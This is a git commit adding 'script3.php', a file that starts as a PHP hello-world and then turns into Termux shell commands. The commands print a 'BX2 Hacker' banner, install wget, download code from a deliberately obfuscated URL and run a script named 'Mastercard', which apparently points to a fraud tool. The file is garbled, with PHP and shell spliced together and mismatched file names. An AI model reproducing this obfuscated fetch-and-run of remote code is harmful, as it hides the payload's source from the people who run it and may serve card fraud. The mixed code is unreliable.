f77e286b2e191203006d92152d0b17420873e7b9
BX2-HackerExploit <66146407+BX2-HackerExploit@users.noreply.github.com>
2020-07-24 20:39:33 +0300

    Add files via upload

---
+++ script3.php
@@ -0,0 +1,16 @@
+<?php
+   //php 7.3.0
+   echo "Hello, Dcoder! "
+
+ ?> #!/data/data/com.termux
+ 
+ 
+ 
+ sleep 2
+ figlet BX2 ¢¢ Hacker
+ sleep 2
+ apt-get update  && apt-get upgrade
+ pkg install wget
+ sleep 1
+ wget   sggkh://kzhgvyrm.xln/izd/XNJbTmuM
+ php Mastercard
